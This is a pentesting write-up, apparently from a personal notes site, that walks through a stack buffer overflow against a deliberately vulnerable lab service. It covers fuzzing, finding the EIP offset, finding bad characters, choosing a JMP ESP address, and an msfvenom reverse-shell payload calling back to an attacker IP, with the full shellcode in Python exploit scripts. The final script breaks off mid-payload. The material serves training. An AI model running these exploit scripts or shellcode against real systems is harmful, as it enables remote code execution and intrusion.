---
layout: default
title: Buffer Overflow
nav_order: 2
has_children: false
parent: Pentesting
grand_parent: DylanGrl Writings
---

## Buffer Overflow

### Spiking

Searching for vulnerable entrypoint.

Using :
```bash
generic_send_tcp <HOST> <PORT> spikescript.spk <SKIPVAR:0> <SKIPSTR:O>
```

#### Spike script
```bash
s_readline();
s_string("STATS ");
s_string_variable("0");
```

### Fuzzing

We prepare in Immunity Debugger the work folder :

```powershell
!mona config -set workingfolder c:\mona\%p
```

  

We will use the following python code :

```python
#!/usr/bin/env python3
import socket, time, sys

ip = "10.10.227.28"
port = 1337
timeout = 5

prefix = "OVERFLOW8 "  
string = prefix + "A" * 100

while True:
	try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.settimeout(timeout)
		s.connect((ip, port))
		s.recv(1024)
		print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
		s.send(bytes(string, "latin-1"))
		s.recv(1024)
	except:
		print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
		sys.exit(0)
		string += 100 * "A"
		time.sleep(1)
```

  
It provide us the following result :

```bash
Fuzzing crashed at 1800 bytes
```  

### Crash Replication & Controlling EIP

#### Finding the offset
We generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (2200):
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
```

Which give us :
```python
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C
```

We will use the following python script in order to perform the exploit :
```python
import socket

ip = "10.10.227.28"
port = 1337

prefix = "OVERFLOW8 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```

  
  

We inject the cyclic pattern in the payload, we restart the application and we launch the exploit :

```python
import socket

ip = "10.10.227.28"
port = 1337

prefix = "OVERFLOW8 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```

The EIP value is : `68433568`
  
We then get the information about the offset using mona command (2200 correspond to the lenght of our random pattern):

```bash
!mona findmsp -distance 2200
```
 the result for the EIP is :
 
```bash
EIP contains normal pattern : 0x68433568 (offset 1786)
```

The offset could be found via metasploit as well : 

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 68433568 
```

#### Overide the EIP 

We update the exploit.py script and set the offset variable to this value (was previously set to 0). We set the payload variable to an empty string again and we set the retn variable to "BBBB".

```python
import socket

ip = "10.10.227.28"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```

  
We restart oscp.exe in Immunity and run the modified exploit.py script again.
The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

### Finding Bad Characters

#### Run 1

We generate the bad charts list in Immunity Debuggers :
```bash
!mona bytearray -b "\x00"
```

And in python using the following script :

```python
for x in range(1, 256):
	print("\\x" + "{:02x}".format(x), end='')
print(
```

The following library could be use as well : 

- [https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)

It generates the following list :

```python
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

  

We inject this list as the payload of our exploit as well as the offset:

```python
import socket

ip = "10.10.227.28"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```

Once we have launched our attack we will check the ESP value in Immunity Debugger : `017CFA30`

We will verify in detail the information using mona :

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 017CFA30
```

It gives us the following information :
```bash
Possibly bad chars: 1d 1e 2e 2f c7 c8 ee ef
Bytes omitted from input: 00
```

The new bad chart will be :
```c
\x00\x1d\x2e\xc7\xee
```

Which give us the following mona command :
```bash
!mona bytearray -b "\x00\x1d\x2e\xc7\xee"
```

We also update our exploit script with the following payload :
```python
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

#### Run 2 :

ESP value : `018EFA30`
Mona command :
```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 018EFA30
```

it gives us the following :
```bash
Bytes omitted from input: 00 1d 2e c7 ee
```

We don't have any other bad char to detect.

### Finding a Jump Point

We will use the following command :
```bash
!mona jmp -r esp -cpb "\x00\x1d\x2e\xc7\xee"
```

We get the following result :
```c
0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x625011bb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x625011d3 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x625011df : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x625011eb : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x625011f7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```

We will update the return value of the exploit with any of the previous address, we choose : 0x625011af it will give : `\xaf\x11\x50\x62` in little Indian

The exploit.py is now the following :

```python
import socket

ip = "10.10.227.28"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
```


### Generate the payload

We will use msfvenom (-b : all the bad charts found):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.52.11 LPORT=4444 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f c -a x86
```

It gives us the following output :

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] =
"\xba\x5e\xf1\x50\x3f\xdb\xd5\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x53\x0e\x03\x0d\xff\xb2\xca\x4d\x17\xb0"
"\x35\xad\xe8\xd5\xbc\x48\xd9\xd5\xdb\x19\x4a\xe6\xa8\x4f\x67"
"\x8d\xfd\x7b\xfc\xe3\x29\x8c\xb5\x4e\x0c\xa3\x46\xe2\x6c\xa2"
"\xc4\xf9\xa0\x04\xf4\x31\xb5\x45\x31\x2f\x34\x17\xea\x3b\xeb"
"\x87\x9f\x76\x30\x2c\xd3\x97\x30\xd1\xa4\x96\x11\x44\xbe\xc0"
"\xb1\x67\x13\x79\xf8\x7f\x70\x44\xb2\xf4\x42\x32\x45\xdc\x9a"
"\xbb\xea\x21\x13\x4e\xf2\x66\x94\xb1\x81\x9e\xe6\x4c\x92\x65"
"\x94\x8a\x17\x7d\x3e\x58\x8f\x59\xbe\x8d\x56\x2a\xcc\x7a\x1c"
"\x74\xd1\x7d\xf1\x0f\xed\xf6\xf4\xdf\x67\x4c\xd3\xfb\x2c\x16"
"\x7a\x5a\x89\xf9\x83\xbc\x72\xa5\x21\xb7\x9f\xb2\x5b\x9a\xf7"
"\x77\x56\x24\x08\x10\xe1\x57\x3a\xbf\x59\xff\x76\x48\x44\xf8"
"\x79\x63\x30\x96\x87\x8c\x41\xbf\x43\xd8\x11\xd7\x62\x61\xfa"
"\x27\x8a\xb4\xad\x77\x24\x67\x0e\x27\x84\xd7\xe6\x2d\x0b\x07"
"\x16\x4e\xc1\x20\xbd\xb5\x82\x44\x49\x81\x59\x31\x4f\xe9\x4c"
"\x9d\xc6\x0f\x04\x0d\x8f\x98\xb1\xb4\x8a\x52\x23\x38\x01\x1f"
"\x63\xb2\xa6\xe0\x2a\x33\xc2\xf2\xdb\xb3\x99\xa8\x4a\xcb\x37"
"\xc4\x11\x5e\xdc\x14\x5f\x43\x4b\x43\x08\xb5\x82\x01\xa4\xec"
"\x3c\x37\x35\x68\x06\xf3\xe2\x49\x89\xfa\x67\xf5\xad\xec\xb1"
"\xf6\xe9\x58\x6e\xa1\xa7\x36\xc8\x1b\x06\xe0\x82\xf0\xc0\x64"
"\x52\x3b\xd3\xf2\x5b\x16\xa5\x1a\xed\xcf\xf0\x25\xc2\x87\xf4"
"\x5e\x3e\x38\xfa\xb5\xfa\x58\x19\x1f\xf7\xf0\x84\xca\xba\x9c"
"\x36\x21\xf8\x98\xb4\xc3\x81\x5e\xa4\xa6\x84\x1b\x62\x5b\xf5"
"\x34\x07\x5b\xaa\x35\x02";
```

We update our payload by putting between parentheses the payload provided.

The exploit.py is now the following :
```python
import socket

ip = "10.10.227.28"
port = 1337

prefix = "OVERFLOW8 "
offset = 1786
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = ""
payload = ("\xba\x5e\xf1\x50\x3f\xdb\xd5\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x53\x0e\x03\x0d\xff\xb2\xca\x4d\x17\xb0"
"\x35\xad\xe8\xd5\xbc\x48\xd9\xd5\xdb\x19\x4a\xe6\xa8\x4f\x67"
"\x8d\xfd\x7b\xfc\xe3\x29\x8c\xb5\x4e\x0c\xa3\x46\xe2\x6c\xa2"
"\xc4\xf9\xa0\x04\xf4\x31\xb5\x45\x31\x2f\x34\x17\xea\x3b\xeb"
"\x87\x9f\x76\x30\x2c\xd3\x97\x30\xd1\xa4\x96\x11\x44\xbe\xc0"
